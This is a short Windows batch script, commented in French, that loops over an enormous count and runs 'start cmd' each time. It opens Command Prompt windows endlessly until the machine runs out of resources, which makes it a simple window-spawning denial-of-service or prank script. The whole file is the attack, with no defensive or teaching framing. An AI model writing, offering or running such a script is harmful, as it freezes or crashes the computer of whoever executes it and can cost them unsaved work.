@echo off
set nombre_de_fenetres=10000000000000

REM Boucle pour ouvrir le nombre spécifié de fenêtres Command Prompt
for /L %%i in (1,1,%nombre_de_fenetres%) do (
    start cmd
)
